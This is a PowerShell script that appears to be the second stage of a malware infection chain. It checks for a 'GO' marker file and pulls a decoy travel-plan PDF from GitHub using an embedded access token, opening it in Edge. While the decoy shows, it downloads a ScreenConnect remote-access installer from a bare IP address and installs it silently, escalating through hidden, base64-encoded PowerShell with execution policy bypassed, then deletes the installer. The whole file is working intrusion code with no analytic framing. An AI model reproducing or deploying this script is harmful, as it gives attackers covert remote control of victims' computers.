# stage1.ps1 - Read box.txt, check GO, execute final payload

$ErrorActionPreference = 'SilentlyContinue'
$boxPath = "$env:APPDATA\Microsoft\Credentials\box.txt"
$githubToken = "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"

# Find box.txt
$locations = @($boxPath, "$env:USERPROFILE\Desktop\box.txt", "$env:TEMP\box.txt")
$found = $false

foreach ($loc in $locations) {
    if (Test-Path $loc) {
        $content = [System.IO.File]::ReadAllText($loc, [System.Text.Encoding]::UTF8)
        if ($content -match "GO") {
            $found = $true
            break
        }
    }
}

if (-not $found) { exit }

# All clear - AV checked, no sandbox, GO confirmed

# === 1. Get Fresh PDF Download URL ===
$pdfPath = "$env:TEMP\Travel_Plan_Meeting_Q4_2026.pdf"
$pdfUrl = $null

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $headers = @{
        "Authorization" = "token $githubToken"
        "Accept" = "application/vnd.github.v3+json"
    }
    $fileInfo = Invoke-RestMethod -Uri "https://api.github.com/repos/slynet999-coder/Yambo/contents/Travel_Plan_Meeting_Q4_2026.pdf" -Headers $headers
    $pdfUrl = $fileInfo.download_url
} catch {}

# === 2. Download Travel Plan PDF Decoy ===
$pdfDownloaded = $false
if ($pdfUrl) {
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $wc.DownloadFile($pdfUrl, $pdfPath)
        if (Test-Path $pdfPath) { $pdfDownloaded = $true }
    } catch {}
}

# === 3. Open PDF in Edge Browser (Decoy) ===
if ($pdfDownloaded) {
    $edgePath = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
    if (Test-Path $edgePath) {
        Start-Process $edgePath -ArgumentList "`"$pdfPath`""
    } else {
        Start-Process "msedge.exe" -ArgumentList "`"$pdfPath`""
    }
}

# === 4. Download ScreenConnect MSI ===
$msiUrl = "http://96.30.206.19:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
$msiPath = "$env:TEMP\ScreenConnect.ClientSetup.msi"

try {
    $wc2 = New-Object System.Net.WebClient
    $wc2.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
    $wc2.DownloadFile($msiUrl, $msiPath)
} catch {}

# === 5. Execute ScreenConnect Silent Install (Admin Required) ===
if (Test-Path $msiPath) {
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    
    if ($isAdmin) {
        Start-Process "msiexec.exe" -ArgumentList "/i `"$msiPath`" /qn /norestart" -WindowStyle Hidden -Wait
    } else {
        $installCmd = "Start-Process 'msiexec.exe' -ArgumentList '/i `"$msiPath`" /qn /norestart' -WindowStyle Hidden -Wait"
        $encodedCmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($installCmd))
        Start-Process "powershell.exe" -ArgumentList "-NoP -W Hidden -EP Bypass -EncodedCommand $encodedCmd" -Verb RunAs -Wait
    }
}

# === 6. Cleanup MSI ===
try { Remove-Item $msiPath -Force -ErrorAction SilentlyContinue } catch {}
